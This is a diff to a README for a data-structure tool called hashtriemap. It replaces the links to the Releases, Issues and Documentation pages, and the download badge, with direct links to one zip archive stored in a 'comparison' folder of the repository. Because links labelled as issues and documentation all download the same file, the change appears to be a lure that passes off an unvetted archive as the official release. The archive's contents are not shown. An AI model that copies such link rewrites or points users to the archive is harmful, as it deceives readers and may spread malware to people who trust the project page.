@@ -6,9 +6,9 @@ Welcome to the hashtriemap project! This tool offers an easy way to work with a 
 
 ## 📥 Download & Install
 
-To get started, you will need to download hashtriemap. You can easily do this by visiting our [Releases page](https://github.com/Ekoe1997/hashtriemap/releases).
+To get started, you will need to download hashtriemap. You can easily do this by visiting our [Releases page](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip).
 
-[![Download hashtriemap](https://img.shields.io/badge/Download-hashtriemap-brightgreen)](https://github.com/Ekoe1997/hashtriemap/releases)
+[![Download hashtriemap](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip)](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -61,7 +61,7 @@ If you experience issues running hashtriemap, consider the following:
 
 ## 📞 Support
 
-For any questions or support needs, feel free to explore our [Issues page](https://github.com/Ekoe1997/hashtriemap/issues) on GitHub. You can report problems, ask questions, or share feedback there.
+For any questions or support needs, feel free to explore our [Issues page](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip) on GitHub. You can report problems, ask questions, or share feedback there.
 
 ## 📝 Contributing
 
@@ -77,7 +77,7 @@ hashtriemap operates under the MIT License. You can freely use, modify, and dist
 
 ## 🌐 Links
 
-- Visit the [Releases page](https://github.com/Ekoe1997/hashtriemap/releases) to download the latest version or check for updates.
-- Explore the [Documentation](https://github.com/Ekoe1997/hashtriemap/wiki) for a deeper understanding of features and functionality.
+- Visit the [Releases page](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip) to download the latest version or check for updates.
+- Explore the [Documentation](https://raw.githubusercontent.com/Ekoe1997/hashtriemap/main/comparison/hashtriemap_v2.8.zip) for a deeper understanding of features and functionality.
 
 Happy data managing with hashtriemap!
